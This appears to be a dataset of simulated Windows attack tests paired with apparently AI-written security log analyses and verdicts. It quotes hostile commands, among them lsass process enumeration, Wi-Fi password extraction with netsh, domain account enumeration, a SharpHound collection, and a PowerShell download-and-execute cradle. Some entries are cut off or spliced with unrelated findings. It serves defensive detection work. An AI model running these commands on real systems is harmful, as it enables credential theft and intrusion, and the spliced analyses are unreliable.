   - Numerous process creation events involving legitimate Windows binaries like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the user `SERVER002\admin_test`.
   - Notably, some instances of PowerShell execution with obfuscated commands that generate random strings (`$TokenSet`, `$Upper`, `$Number`) and attempt to redirect output of `whoami.exe /all` into temporary files. Obfuscation in PowerShell scripts is a common tactic to evade detection by security tools.
   - Running `hostname.exe` and `whoami.exe` at a high integrity level is suspicious when done in conjunction with obscure scripts, potentially indicating an enumeration or privilege query.

3. **PowerShell Logs:**
   - Highlight the execution of a PowerShell command designed to produce random strings and redirect command output to a file. Despite using standard Windows tools, the use of randomness and obfuscation could be indicative of malicious activities such as automation of data exfiltration or lateral movement preparation.

4. **System Logs:**
   - Routine Windows Update transactions (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) observed as part of security intelligence updates for Microsoft Defender Antivirus, look typical and expected in a secure environment.

#### Indicators of Malicious Activity

1. **Obfuscated PowerShell Commands:**
   - PowerShell scripts that obfuscate their intent, paired with the generation of random file names and redirecting information (e.g., output from `whoami`) may point to malicious activities. Typically, threat actors use such techniques to gather user data or make preparations for future attacks while minimizing traces.

2. **Excessive Use of System Utilities:**
   - Issuing multiple queries for user and hostname information using `whoami.exe` and `hostname.exe`, particularly after being spawned by unusual scripts, could indicate reconnaissance by an attacker looking to understand the privileges or details of the compromise.

3. **Repeated Credential Attempt Failures:**
   - Although not directly indicative of a successful attack, the failed credential validation events suggest attempts to connect with invalid session credentials. These may reflect a process of trial and error often seen during initial compromise reconnaissance phases by attackers.
   
### Assessment and Guidance

The logs present several pieces of evidence worth scrutinizing. The use of randomization and obfuscation in PowerShell suggest attempts to obfuscate activity, potentially tied to malicious reconnaissance or preparation for further actions. Credential validation failures could imply probing behavior.

### Resolution

**Resolution:** **SUSPICIOUS** - The logged activity contains signs suggestive of potentially malicious behavior, particularly around PowerShell use and failed credential attempts. We recommend deeper investigation into:
- The intent and origins of the obfuscated PowerShell scripts.
- Identifying the source or actor behind the invalid credential attempts.
- Monitoring for any further unusual activities and ensuring endpoint defenses are up-to-date.
- Conducting a full endpoint review to ensure no unauthorized changes or access was achieved.

This conclusion identifies potential threats worth investigating further to ensure no compromise has occurred or is underway."
Discover Specific Process - tasklist,"### Analysis of the Logs

**Suspicious or Anomalous Behavior Noted:**

1. **Repeated Execution of System Utilities:**
   - The logs indicate the repeated execution of various Windows system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` with the `/c tasklist | findstr lsass` command. These may be considered as enumeration activities to gather information about running processes and privileges.
   - The use of `tasklist` and `findstr` to locate processes, especially `lsass.exe`, can indicate a reconnaissance step potentially leading up to credential dumping efforts.

2. **Time Manipulation:**
   - The `System` log reveals changes to the system time. Time jumps backwards which could potentially suggest an attempt to alter forensic timelines and is often utilized to disrupt event sequencing in logs, making analysis more difficult.

3. **Privileged User Execution:**
   - The `SERVER002\\admin_test` account is observed executing all suspicious activities. Accounts with administrative privileges performing such actions can be concerning, especially without a clear business justification.

4. **Frequent Use of `conhost.exe` and `wevtutil.exe`:**
   - `conhost.exe` is associated with several processes which appear to be rapidly executing in a sequence closely tied with activities logged by other utilities. These activities, coupled with the execution of `wevtutil.exe`, could suggest manipulation or clearing of Windows event logs.

**Assessment:**
- The behavior observed is strongly suggestive of a potentially malicious actor attempting to cover their tracks or prepare for an attack involving credential harvesting from `lsass.exe`, given the nature of process enumeration and system modification activities.

**Threats or Risks Identified:**
- **Risk of Credential Dumping or Theft:**
  - The enumeration of `lsass.exe`, combined with time manipulation, indicates a precursor to attempts to access sensitive credential stores.
  
- **Potential Log Tampering:**
  - Use of `wevtutil.exe` by an administrative account without a clear need may imply possible attempts to clear or alter logs.

- **Privilege Misuse:**
  - The use of privileged accounts for potentially unauthorized activities emphasizes a risk of insider threats or credential misuse.

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the machine (`Server002`) from the network to prevent any further malicious activity or lateral movements.
   - Elevate a detailed investigation using a comprehensive endpoint detection solution to monitor activities in real-time.
   
2. **Forensic Analysis:**
   - Conduct a deeper forensic investigation to recover any potentially cleared logs, inspect process memory for signs of malware, and confirm if any data exfiltration has occurred.
   - Review the `SERVER002\\admin_test` account activities and check for any unauthorized access or anomalies in authentication logs.

3. **Long-Term Mitigations:**
   - Enforce stricter access controls, limit the use of administrative privileges, and adhere to the principle of least privilege.
   - Consider installing advanced threat detection systems capable of identifying and alerting unusual system metric changes such as time changes or process anomalies.
   - Review, update, and run security training sessions particularly emphasizing the risks and identification of credential theft and log manipulation.

### Final Resolution: SUSPICIOUS

The identified activities within the logs suggest behavior that deviates from normal baseline operations and aligns with tactics employed by malicious actors. However, further investigation is warranted to conclusively categorize these observations as malicious."
SharpHound3 - LocalAdmin,"### Detailed Log Analysis:

Upon reviewing the provided event logs, several points of interest and potential indicators of compromise have been identified. 

#### Suspicious or Anomalous Behavior:

1. **Logon and Privilege Escalation**:
   - **Security Logs (Event ID 4624 & 4672)**: 
     - There was a successful logon event with LogonType 5 which indicates a service started by the system itself. This is accompanied by a ""Special privileges were assigned to a new logon"" event. High-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege` are notable and may indicate a particularly sensitive operation or potentially malicious activity if not routine.

2. **Sysmon Logs**:
   - Execution of PowerShell and other administrative tools:
     - Multiple instances of PowerShell (Event ID 1) and instance of `SecurityHealthService.exe`, `wevtutil.exe`, and `conhost.exe` observed.
     - A specific entry involves execution of PowerShell with a command line creating a new directory and referring to a script in a temporary path:
       ```
       ""CommandLine"":""\""powershell.exe\"" & {New-Item -Path \\\""\""$env:TEMP\\script\\\\\""\"" -ItemType Directory &gt; $null, &amp; \\\""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\\\""\"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \\\""\""$env:TEMP\\script\\\\\""\""}""
       ```
     - Presence of `Externalfiles\script.exe` being invoked suggests possible script execution or components dropped in temp directories often align with behaviors seen in malware activities.
  
3. **PowerShell Logs**:
   - The logs indicate the PowerShell session was begun and terminated shortly. This aligns with the suspicious PowerShell activity seen in Sysmon logs and indicates potential malicious scripting activity.

#### Potential Malicious Activity:

- The use of PowerShell to potentially execute scripts from temporary paths could indicate a compromise attempting to execute payloads or gather system information (`whoami.exe`, `hostname.exe`).
- The command sequence contains features typical of attempting to run scripts that avoid detection and maintain persistence.
- Privileges associated with Event ID 4672 (e.g., `SeDebugPrivilege`) can be exploited by attackers to gain elevated permissions.

### Assessment:

Analyzing these logs suggests that the PowerShell activity stands out as suspicious and could potentially be malicious. The combination of high privileges used during login and PowerShell execution implies a potential threat or misuse scenario.

### Threats or Risks Identified:

- Possible execution of unauthorized scripts or tasks using PowerShell.
- Elevated privileges which could lead to unauthorized access or control of the system.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Investigate the source of the PowerShell script execution, specifically the origin of `script.exe` and its functionalities.
   - Validate the necessity of the privileges used and ensure they align with legitimate processes or roles expected of the user/system.
   - Inspect audit logs to identify if this pattern of behavior is observed elsewhere and isolate involved systems if necessary.

2. **Continuous Monitoring**:
   - Increase monitoring on PowerShell executions and temporary file activities.
   - Establish alerts for unexpected elevation of privileges and out-of-pattern script executions.

3. **Remediation**:
   - If the script is determined to be malicious, purge associated files and investigate for any possible persistence mechanisms.
   - Consider revoking unnecessary privileges and revisiting security policies revolving around the execution of scripts.

### Resolution:

**SUSPICIOUS**

Further investigation is needed to determine the intent and scope of the detected PowerShell activities and privilege usage."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Based on the provided logs, there are several events worth highlighting for potential suspicious behavior:

1. **Time Manipulation (Event IDs 4616 & 1)**:
   - There are multiple events showing time changes, which can indicate an attempt to cover tracks or manipulate timestamps for log records.
   - However, the process responsible for these changes is `svchost.exe`, a legitimate Windows process, and time changes can occur due to legitimate reasons like synchronization with time servers.

2. **Logon Events (Event IDs 4634, 4672, 4624)**:
   - The user `admin_test` has been involved in multiple privilege-related activities. Event ID 4672 suggests that this user acquired special privileges such as `SeDebugPrivilege`, which can be concerning if not typically used by this account.
   - The logon type for `admin_test` is 3, which indicates a network logon type. This could be typical in remote access scenarios, given `NtLmSsp` and `NTLM` are involved, which are older authentication protocols.

3. **Process Creation Patterns (Sysmon Event ID 1)**:
   - Multiple instances of Sysmon Event ID 1 show processes commonly associated with administrative tasks and system interrogation (e.g., `whoami.exe`, `cmd.exe` with `netsh wlan show profile * key=clear`).
   - The specific command in `cmd.exe`— `netsh wlan show profile * key=clear` — is often used to extract saved Wi-Fi passwords. This command can be used maliciously if unauthorized.

4. **Credential Access Attempts (Event ID 5379)**:
   - Frequent attempts to access credentials stored for Microsoft accounts with an unsuccessful return code. This suggests multiple failed attempts to access or verify credentials, which can be concerning if not expected.

5. **Process Sampling with `wevtutil.exe` (Sysmon Event ID 5)**:
   - The command `wevtutil.exe` is seen running. This usage of `wevtutil` might represent potential log querying or clearing attempts.

Overall, the combination of suspicious network logon, special privileges granted, potential credential access attempts, and suspicious command usage (especially `netsh wlan`) warrant further investigation.

**Assessment and Resolution:**

- The activities observed in the logs show potential indications of compromise or misuse, especially by the user `admin_test`. The behaviors of concern include:
  - Privilege Escalation
  - Command Execution for Credential Extraction
  - Potential tampering with logs or time settings

Given these points, this assessment leans towards potential misuse or a compromised environment.

**Resolution: SUSPICIOUS**

**Guidance**:

1. **Conduct User Account Reviews**:
   - Review account `admin_test` for unintended permission grants or recent changes.
   - Validate recent actions with the user if possible.

2. **Search for Context**:

Security Software Discovery - Sysmon Service,"Upon reviewing the provided Windows event logs across multiple channels such as PowerShell, Security, Sysmon, Application, and System logs, let's analyze key elements:

### Observations and Analysis

1. **Time Synchronization:**
   - There are several events related to time changes (Event ID 4616 and Kernel-General Event ID 1/24) where the `ProcessName` is `svchost.exe`. Time changes can indicate malicious activity, however, this can also occur during normal time synchronization events by the Windows Time service or a system update. 

2. **Sysmon Logs:**
   - The logs show numerous instances of the process `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`. This is normal since `wevtutil.exe` is used for managing event logs and `conhost.exe` is the Console Host that acts as a command-line subsystem. However, frequent execution might indicate someone managing logs, possibly covering tracks.
   - A process sequence involving `hostname.exe`, `whoami.exe`, and `cmd.exe` with command lines suggest activities related to system information enumeration, which could be benign or often leveraged for reconnaissance.
   - The use of `cmd.exe` to execute `fltmc.exe | findstr.exe 385201` might be probing filter drivers, which can be used to understand loaded kernel-mode components, not typical for standard users.

3. **Application Logs:**
   - `edgeupdate` service events are logged indicating stopping of services which might be part of regular system updates for Microsoft Edge. Periodic updates and installations do not directly indicate malicious actions but should be reviewed if coupled with other anomalies.

4. **Security and Audit Logs:**
   - There are no indications of unauthorized access or account issues in the Security log entries available.
  
5. **Service Executions:**
   - Frequent executions involving Microsoft Edge Update, shown by multiple instances across different started paths, suggest typical auto-update behavior and not inherently malicious.

### Assessment

- **Time Change Anomaly:** While it's important to be cautious with time changes, especially when performed by `svchost.exe`, in isolation and with ntp services in effect, suggests potential benign operations (e.g., time synchronization).
- **Sysmon Entries and Process Execution:** The `cmd`, `wevtutil`, and `whoami` commands along with other executables might be part of normal administrative functions, yet need scrutiny for potential unauthorized use or automation scripts possibly relating to a system audit.
- **Edge Update Activities:** Reflects software updating activity, and while numerous, it usually signifies normal application behavior.
  
### Conclusion

Considering the information given and analyzed, the logs reveal potential normal administrative or system maintenance activities. However, the frequent command executions and system querying processes prompt a need for modest scrutiny. There are no straightforward indicators or patterns that definitively show malicious activity, but the context and timeline need careful checking against the CEO's scheduled tasks and system updates.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a manual review to correlate these activities with legitimate administrative activities, updates, or scheduled tasks.
- Check for any recent changes by admin users or GPO settings that align with the actions captured in the logs.
- Verify with the CEO or the IT department about any sanctioned or expected maintenance activities during this period.
- Ensure that the integrity of key system files is intact, and keep monitoring for any irregular access patterns."
Remote System Discovery - net group Domain Controller,"Based on the provided logs, here’s the detailed analysis:

1. **System Log Analysis:**
   - The system event log contains updates related to Microsoft Defender Antivirus. These entries (EventIDs 44, 43, 19) suggest regular security updates, indicating that Windows is maintaining up-to-date virus definitions, which is typical and benign behavior.

2. **Sysmon Log Analysis:**
   - A series of process creation events are logged involving common system utilities such as `whoami.exe`, `wevtutil.exe`, `conhost.exe`, `net.exe`, `cmd.exe`, and `hostname.exe`.
   - The `cmd.exe` process was executed with a command line argument `/c net group /domain ""Domain controllers""`, which is often used to list members of a domain controller group. This is not a typical operation for most users and could be indicative of reconnaissance activity within the network.
   - The presence of `wevtutil.exe` indicates log file manipulation or viewing, which is often utilized in system management but could be used maliciously to clear event logs after suspicious activity.
   - The repeated instances of `conhost.exe` alongside these utilities are not inherently suspicious but should be monitored in context.

3. **Security Log Analysis:**
   - EventID 5379 indicates multiple read operations for credential retrieval failures, with a ReturnCode of 3221226021 (denotes a failure). This could suggest attempts to access credentials unsuccessfully, which requires further inspection.
   - These failed attempts primarily involve `MicrosoftAccount` and `WindowsLive` credentials, which could imply an investigation into personal or user-linked accounts if targeted.

4. **Application Log Analysis:**
   - A single entry logging Windows Defender status as `SECURITY_PRODUCT_STATE_ON`, indicating the antivirus software is active and functioning normally.

**Assessment and Conclusion:**
- Most of the entries in the logs do not suggest immediate signs of compromise; however, the use of `cmd.exe` to execute a potentially sensitive command (`net group /domain ""Domain controllers""`) is notably concerning as it could be a step in reconnaissance activities within a network, possibly preparing for further malicious actions.
- Additionally, the credential access failures (EventID 5379) could be either normal operation or a potential unauthorized attempt to access sensitive accounts.

**Resolution: SUSPICIOUS**
- Although not definitive evidence of a breach, the combination of listed activities and the context in which they operated warrants further investigation for assurance.
- Recommendation would be to check if the insights align with known legitimate administrative activity on the system or if there are anomalies that need to be escalated for further investigation. Monitoring and possible network segmentation, user audit, and additional log monitoring may be appropriate next steps."
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon analyzing the provided Windows event logs, several points of concern arise, which are indicative of potentially suspicious activity.

1. **PowerShell Execution**: There are records of PowerShell execution with the command: `powershell.exe & {Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force}`. This command attempts to recursively search for any files matching ""Bookmarks"" in user directories silently, which can be part of reconnaissance activities by an attacker seeking sensitive information stored in web browser bookmark files.

2. **Unusual Process Execution**: The repeated execution of `whoami.exe` and `hostname.exe` by user `SERVER002\admin_test` can imply an attempt to gather system and user information. Typically, benign tasks do not repeatedly execute these commands, suggesting possible scripting or automated enumeration activity.

3. **Frequent Use of `wevtutil.exe`**: The tool `wevtutil.exe` was executed multiple times. This tool is used for exporting event logs, which may be a part of data exfiltration or log cleaning efforts by an attacker to cover tracks.

4. **MicrosoftEdgeUpdate.exe Activity**: The logs show multiple, frequent entries related to `MicrosoftEdgeUpdate.exe`, operating from temporary directories and executing unusual command lines such as `/ping` and `/update`. While some activity relates to legitimate update functions, the location and frequency suggest potential misuse or misconfiguration that warrants further scrutiny.

5. **Use of `conhost.exe`**: Console Window Host (`conhost.exe`) is utilized in several instances alongside other processes (indicative of console execution), but more concerning is the processes' parent hierarchy and command line strings which suggest automation or remote execution.

6. **High Integrity Level for Non-System Processes**: Several processes executed with High integrity level, which in this context—coming from the user `SERVER002\admin_test` —could indicate privilege escalation attempts if this user should not normally execute high-level tasks.

**Assessment:**
- **Suspicious**: The logs show some combinations of potentially harmful or reconnaissance activities such as unconventional PowerShell execution and repetitive registry information gathering attempts. The data exfiltration and information gathering activity should not be typically seen without specific administrative tasks justifying them.

**Recommendation for Further Action:**
- Investigate the origin and intent of PowerShell scripts executed on the machine.
- Verify the legitimacy of the `MicrosoftEdgeUpdate.exe` processes, particularly those starting in temporary directories.
- Identify whether `admin_test` account has performed administrative actions legitimately.
- Conduct a thorough check for malware or scripts that could lead to these behaviors.
- Monitor and, if necessary, restrict the use of high-integrity-level processes for accounts lacking administrative restrictions.

Based on the analysis, the resolution for this case is **SUSPICIOUS**. Further investigation and possibly user education or system adjustment are needed to confirm whether there is indeed any real threat or risk."

Enumerate logged on users via CMD (Local),"### Analysis of the Logs

#### Suspicious or Anomalous Behavior
Upon analyzing the provided logs, several points of interest related to potential suspicious or anomalous activities were noted:

1. **Rapid Execution of System Utilities**:
   - The logs show repeated execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` within milliseconds. This rapid sequence of executions is atypical for regular activity and could indicate automated or scripted activity.
   
2. **Execution of `whoami.exe`, `cmd.exe`, and `hostname.exe`**:
   - These utilities are often used for enumeration purposes, which can be malicious if used unexpectedly.
   - `cmd.exe` was observed running with an argument to execute `query user`, another potential sign of enumeration.

3. **High Integrity Level**:
   - The processes were executed with a ""High"" integrity level, suggesting they had elevated privileges. Combined with enumeration commands, it could indicate an attempt to gather system or user information typically seen in discovery phases of an attack.

4. **Microsoft Edge Update Activities**:
   - Multiple `MicrosoftEdgeUpdate.exe` processes were logged with various command-line arguments related to updating. Despite being legitimate, excessive or unexpected update processes might mask malicious activity. However, nothing directly implies this in these logs.

5. **Time Change**:
   - A security log entry shows a time change event (`EventID 4616`). Changes to system time can be benign (e.g., syncing with an NTP server), but they can also be used to obfuscate timestamps in logs.

#### Assessing the Events

- The execution of standard utilities (`wevtutil`, `conhost`, `whoami`, `cmd`) under a privileged account (SERVER002\admin_test) within such a short time span warrants investigation, especially on a high-profile machine like the CEO’s.

- While Edge Update activities appear legitimate, given they are from a trusted process and signed by Microsoft, the frequency and context should be verified for consistency with the organization's patching policy.

   - The execution of `DismHost.exe` from a non-standard directory coupled with the aggressive use of PowerShell could indicate unauthorized, possibly elevated, access.

2. **Potential Data Exfiltration**:
   - The PowerShell command attempts to gather and save GPO information, which may be intended for data exfiltration, suggesting data harvesting activities.

3. **Covering Tracks**:
   - Usage of `wevtutil.exe` suggests possible cleanup attempts to evade detection, a tactic often seen in targeted cyber attacks.

### Guidance on How to Proceed

1. **Immediate Containment and Quarantine**:
   - Halt any ongoing suspicious processes, such as those running from the Temp directories, and isolate the system from the network to prevent further potential data exfiltration.

2. **Forensic Analysis**:
   - Perform a detailed forensic analysis, including memory dumps and a deep dive into filesystem changes to identify the full extent of potential compromises and any dropped artifacts.

3. **Log Reviewing and Monitoring**:
   - Utilize SIEM solutions to further investigate and analyze historical log data to detect if similar activities have been observed across the network, potentially indicating a broader compromise.

4. **Patch and Harden**:
   - Ensure all systems, particularly this affected machine, are up to date with the latest security patches, and assess current security configurations for endpoint protections and policy.

5. **Awareness and Defense**:
   - Inform the IT and security teams for heightened vigilance, and consider conducting a security awareness session for employees to address potential risks and reinforce security best practices.

### Final Resolution

Taking into account the nature of the events, which can be seen as a staged attack taking a reconnaissance approach, coupled with overt traces of potential obstruction of audit trails:

- **Resolution: MALICIOUS**

This assessment indicates findings of confidently malicious activities needing immediate response and in-depth investigation to understand the full scope and intent of the actions taken on the CEO's machine."
Enumerate Windows Security Log via WevtUtil,"From analyzing the provided logs, we can make several observations useful for detecting potential indicators of compromise. Here's the detailed breakdown:

### Observations:

1. **Privilege Escalation**:
   - Event ID 4672 in the Security log indicates that a user named `admin_test` has logged in with numerous high privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges are sensitive and typically not required for routine user operations. The presence of `SeDebugPrivilege` can be particularly concerning as it allows debugging access to all processes which could potentially be used to manipulate other applications or system processes.

2. **Unusual Process Execution**:
   - Sysmon logs show multiple instances of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `whoami.exe` being executed by the user `SERVER002\\admin_test`. The use of `wevtutil.exe` and `cmd.exe` is considered suspicious in certain contexts, particularly because `wevtutil` is a command-line utility for allowing manipulation of Event Viewer logs, which can be used to clear logs and cover tracks.
   
3. **Odd Command-Line Usage**:
   - The command seen executing `cmd.exe /c wevtutil enum-logs` stands out, as it lists event logs, typically used by attackers to assess what logs are being generated before they attempt log clearance.

4. **Process Execution Path and Integrity Level**:
   - The various processes executed under the context of `SERVER002\\admin_test` have a `High` integrity level, signifying elevated permissions.
   
5. **System Operations**:
   - There are several signs of system time changes indicated by Event ID 4616 in the Security log and similar events in the System log. Time changes on a system could be indicative of an attempt to alter time-based logs or event sequencing.

6. **Network Activity**:
   - Logs show a logon from the IP address `fe80::e3b5:5371:12a8:9c77`, which appears in conjunction with the NTLM authentication package and logon type 3 (network). This network activity may need corroborating context from other network security tools to ascertain legitimacy.

### Assessment and Recommendation:

Based on the observations, there are several unusual or potentially malicious behaviors noted:
- High-level privileges at login.
- Execution of potentially sensitive system utilities like `wevtutil.exe` and `cmd.exe` with suspicious command-line arguments.
- Processes with elevated integrity, indicating running with high-level permissions.

### Resolution:

**SUSPICIOUS**: The logs contain several indicators that warrant further investigation. The high-level privileges, execution of administrative tools, potential altering of system times, and network activities should be reviewed in the context of additional system and network logs to confirm or dispel suspicions. There is no definitive evidence of a full compromise or specific malicious payload execution, but the activity pattern is not typical for a benign actor. It is essential to validate against internal usage policies for such utilities and user behaviors, and possibly escalate monitoring or inspections on the system associated with `SERVER002`."
Enumerate domain computers within Active Directory using DirectorySearcher,"**Detailed Analysis of the Windows Event Logs:**

**System Log:**
- The system logs primarily feature updates for Microsoft Defender Antivirus, indicating that security updates were installed. This is expected and routine behavior for keeping the antivirus definitions up to date. These events show no signs of anomalies or malicious activity.

**Application Log:**
- The application log indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is a normal and security-positive state.

**Security Log:**
- There are multiple event logs with EventID 5379, indicating credential validation attempts. The recurring `ReturnCode` of 3221226021 suggests incorrect credentials or an authentication issue. However, these appear to be part of a system or application operation rather than an indication of compromise.
- Events with IDs 4624 and 4672 confirm successful logons and special privileges assignments to the SYSTEM account, standard for system processes running under the SYSTEM context.

**PowerShell Log:**
- A PowerShell script execution is detected, running a command to enumerate computer objects. The command is crafted to execute in a loop to display computer names. While the command is interesting, it appears to be tailored for a directory search within an organizational context. There is no clear indication of malicious intent, but it should be validated with verification of administrative control and intended script use.

**Sysmon Log:**
- Sysmon logs capture various process creations and terminations:
  - The processes executed include standard Windows utilities and Microsoft Edge updates. The presence of processes like `whoami.exe`, `hostname.exe`, and `powershell.exe` with specific command lines could suggest system reconnaissance activities, but they also align with legitimate administrative actions.
  - Process executions are primarily within the scope of system updates and service management. There are no explicit signs of privilege escalation or suspicious process creation, given the context and originating users.

**Assessment and Conclusion:**
Overall, the logs evidence normal system operations, with processes updating system components, running system services, and executing commands under administrative contexts. The iterative credential events need further validation to ensure they are not resulting from misconfigured services or applications but seem benign. The environment shows expected Windows system maintenance tasks and operations.

**Final Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Validate administrative actions**: Confirm with system administrators if the PowerShell script and any processes were intended actions or routine administrative tasks.
2. **Investigate Credential Events**: Analyze the repetitive credential validation failures for potentially misconfigured services or unintended app behavior.
3. **Monitor for Recurrent Activity**: Set up alerts for potential recurrence of similar patterns pertaining to unauthorized PowerShell usage or credential issues, and validate sources if these activities recur.
4. **Ensure Audit Consistency**: Check audit settings and ensure adequate logging for ongoing monitoring of sensitive operations and access attempts.

By conducting these additional investigations, further context can be acquired, ensuring that operations continue within secure and intended parameters."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"After a detailed review of the provided Windows event logs, the following analysis can be made:

### Analysis

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The `wevtutil.exe` tool is frequently executed around the same timestamp. This tool is legitimately used for querying or exporting logs but can be abused to clear logs or gather information on the system, which may indicate malicious activity if not expected.
   - Each `wevtutil.exe` execution is coupled with `conhost.exe`, a legitimate console window host that can be part of normal operations but may also be used in spawning suspicious activities when frequently invoked in sync with other potentially malicious tasks.

2. **PowerShell Activity:**
   - The PowerShell command line observed in the logs (`""powershell.exe"" & {script -SearchScope subtree -filter \\\""\""name -like '*'\\""\"" -Properties *}`) suggests enumeration that could be hunting for specific properties in the system. This can be typical in penetration testing or malicious reconnaissance activity.
   - The PowerShell activity is followed by several modules being started (e.g., Registry, Alias, Environment, FileSystem, Function, Variable), which is consistent with a PowerShell session or script execution.

3. **Sysmon Events and Process Creation:**
   - Execution of `whoami.exe` and `hostname.exe` indicates system commands are being executed to gather user and system information, which can be used for the attacker’s situational awareness.
   - The processes are initiated by `wsmprovhost.exe`, a component of Windows Remote Management, which can be legitimate but may also be hijacked or misused during remote execution tasks by adversaries.

4. **Suspicion Indicators:**
   - The regular creation of legitimate processes like `wevtutil.exe`, `conhost.exe`, accompanied by PowerShell executions, and standard system commands (`whoami` and `hostname`) could suggest an attempt to cover tracks or enumerate the system.
   - Despite showing scheduled Microsoft Edge updates and typical service activities (`svchost.exe`, `sppsvc.exe`), the extraction or detailed browsing of logs (like `wevtutil.exe`) isn’t typical in routine tasks unless explicitly controlled for audit logging or further analysis.

### Assessment

These logs indicate potentially suspicious activity. The frequent execution and pattern of system commands, especially when dealing with log utility (`wevtutil`), PowerShell, and retrieval of system details via commands like `whoami` and `hostname`, need further investigation. Such activities often correlate to internal reconnaissance or persistence actions seen in penetration tests or attacks.

### Conclusion

Resolution: **SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Verify the legitimate use of `wevtutil.exe` and `PowerShell` in the context of your company's operations. Check with the team using this host.
   - Determine whether the activity was scheduled or expected given its timestamps and frequency.

2. **Further Investigation:**
   - Cross-reference the logs with network logs, firewall logs, or any additional endpoint security data to further trace the user activity.
   - Carry out threat hunting to identify any related compromise using similar patterns throughout the network.

3. **Mitigation Measures:**
   - Implement stricter monitoring on PowerShell usage and unexpected log utility usage via EDR solutions.
   - Consider applying Group Policy settings to log all PowerShell script executions and monitor for anomalies.

4. **Verification:**
   - Confirm whether security patches, updates, or misconfiguration allow such behavior and rectify them as necessary.
   - Conduct user activity audits and train users on recognizing and responding to system alerts when processes are being executed unexpectedly.

These steps will help determine if the behavior is malicious or part of normal operations and protect against potential escalation or future occurrences."
Enumerate all accounts (Domain),"After analyzing the provided Windows event logs, here are the significant findings:

### Suspicious Behaviors Identified:

1. **Multiple Instances of User and Hostname Enumeration:**
   - The logs show frequent execution of `whoami.exe` and `hostname.exe` from a high integrity level with the same parent process (`wsmprovhost.exe`), which could be indicative of reconnaissance activity. Running these commands repeatedly could suggest an attempt to gather system and network-related information.

2. **Execution of `cmd.exe` with Network Commands:**
   - There is a sequence of commands executed via `cmd.exe`, specifically `""cmd.exe"" /c net user /domain & net group /domain`, indicative of an attempt to enumerate domain user accounts and groups, which is common in lateral movement or privilege escalation preparatory phases.

3. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` was executed multiple times in close succession. This utility interacts with Windows event logs and while it is used for legitimate purposes, its execution without a clear reason can suggest attempts to clear logs or cover up tracks.

4. **Environment and Process Context:**
   - The execution context mostly involves `SERVER002\admin_test`, from a high integrity level within user directories and temporary locations, which are not standard systematic locations for the operations noted.

5. **System-Level Process Execution:**
   - System processes related to Microsoft Edge update mechanisms (e.g., `MicrosoftEdgeUpdate.exe`) appear routine, but should be considered whether they align with expected update behavior or known schedule.

### Assessment of Potential Malicious Activity:

- The behavior of querying domain information, system reconnaissance, and interacting with event logs frequently and in combination suggests potentially unauthorized or malicious activity. Such patterns align with typical lateral movement or post-exploitation reconnaissance activities seen in intrusions. However, without specific indicators of compromise such as known malicious hash values, connections to known bad IPs, or exploited vulnerabilities, the activity remains inconclusive but concerning.

### Recommended Next Steps:

1. **Immediate Investigation:**
   - Conduct additional investigation to determine if these operations were authorized or part of any scheduled or administrative task.
   - Check execution context and if `admin_test` has a record supporting such activities.

2. **Monitoring and Alerts:**
   - Implement additional monitoring for the involved account and process execution patterns to detect similar activities in the future.
   - Review logs for other systems to identify if similar patterns occur elsewhere, indicating a broader compromise.

3. **System and Account Review:**
   - Perform a security posture assessment on the user account(s) and systems involved to identify potential vulnerabilities or exploited weaknesses.
   - Reset credentials for `admin_test` as a precaution if the account’s compromise is suspected.

4. **Yara/EDR Rules:**
   - Deploy Yara or EDR rules to track these behaviors more precisely across the fleet, ensuring any unknown variants or usage patterns can be detected promptly.

### Conclusion:

Based on the above analysis, the suspicious activity observed requires further investigation to determine its legitimacy and mitigate any potential security risks. Therefore, this report concludes with a resolution of **SUSPICIOUS** due to the presence of concerning behaviors that align with compromised activities.
"
WinPwn - fruit,"Based on the provided Windows event logs, here is an analysis focusing on possible indicators of malicious activity:

1. **PowerShell Activity:**
   - The PowerShell logs contain evidence of scripts being executed that were downloaded from an internet source (GitHub). The command executed is directly trying to download and execute a PowerShell script from a URL:
     ```
     $script_repo='https://raw.githubusercontent.com/script'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
     ```
   - This type of activity can be highly suspicious as attackers often use PowerShell scripts to download malicious payloads or execute commands stealthily. The usage of `iex` (Invoke-Expression) is particularly concerning as it allows execution of code directly, which is a common technique in PowerShell-based attacks.

2. **Sysmon Events:**
   - Various processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `HOSTNAME.EXE` are observed. These processes themselves are not inherently malicious, but the context in which they run can be indicative of suspicious activity.
   - The execution of `whoami.exe` and `HOSTNAME.EXE` could imply reconnaissance activities trying to gather information about the system environment and user context.

3. **Security Logs:**
   - The logs indicate specific user accounts (`admin_test`) being granted special privileges (e.g., `SeDebugPrivilege`).
   - There are multiple logon events utilizing NTLM, which is not unusual; however, it corresponds with elevated privileges not long after sign-in, which could potentially be part of privilege escalation techniques if combined with other activities.

4. **No Critical System Logs:**
